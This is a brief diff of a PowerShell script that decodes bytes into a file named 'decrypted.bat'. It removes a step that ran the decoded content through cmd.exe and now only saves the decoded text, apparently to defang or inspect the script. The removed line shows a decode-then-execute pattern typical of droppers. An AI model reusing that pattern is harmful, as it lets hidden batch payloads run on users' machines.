@@ -15,8 +15,6 @@ for ($i = 0; $i -lt $b.Length; $i++) {
 
 $path = "$env:USERPROFILE\decrypted.bat"
 
-[IO.File]::WriteAllBytes($path, $out)
+$text = [Text.Encoding]::UTF8.GetString($out)
 
-
-Start-Process cmd.exe -ArgumentList '/c $out' -UseNewEnvironment -Wait
-
+Set-Content -Path $path -Value $text
